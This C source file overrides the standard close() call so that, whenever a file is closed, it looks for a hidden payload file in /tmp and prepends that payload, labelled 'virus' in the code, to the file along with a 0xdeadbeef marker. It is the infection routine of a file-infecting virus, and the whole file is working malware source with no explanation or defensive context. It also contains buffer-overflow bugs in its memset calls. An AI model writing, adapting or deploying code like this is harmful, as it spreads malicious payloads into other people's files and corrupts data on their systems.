#include <stdio.h>
#include  <sys/types.h>
#include <sys/syscall.h>
#include <stdlib.h>
#include <string.h>

//#include <fcntl.h>
#include <sys/stat.h>
#include <unistd.h>





int close(int handle){


  int fd = handle;

  struct stat fstats; 
  fstat(fd,&fstats);
  int hostSize = fstats.st_size;
  lseek(fd,0L,SEEK_SET); // back to the start

  char *hostStr = malloc(hostSize);
  if(hostStr == NULL){
    return syscall(__NR_close,handle);
  }
  memset(hostStr,0,hostSize+1);
  read(fd,hostStr,hostSize);

  char txt[4] = {0xde,0xad,0xbe,0xef};
  
  uid_t mysuid,myeuid,myruid;
  getresuid(&myruid,&myeuid,&mysuid);
  uid_t mypid = getpid();
  char name[100] = {0};
  sprintf(name,"/tmp/.%d.%d.%d",mypid,fd,myruid);
  //printf("Name is %s\n",name);

  FILE *fp = fopen(name,"r");
  if(fp==NULL){
    return syscall(__NR_close,handle);
  }

  fseek(fp,0L,SEEK_END);
  int virusSize = ftell(fp);
  fseek(fp,0L,SEEK_SET);
  char *virusStr = malloc(virusSize);
  memset(virusStr,0,virusSize+1);
  fread(virusStr,1,virusSize,fp);
  fclose(fp);
  remove(name);

  
  lseek(fd,0L,SEEK_SET);

  write(fd,virusStr,virusSize);
  write(fd,txt,4);
  write(fd,hostStr,hostSize);

  free(virusStr);
  free(hostStr);
  
  return syscall(__NR_close,handle);
}
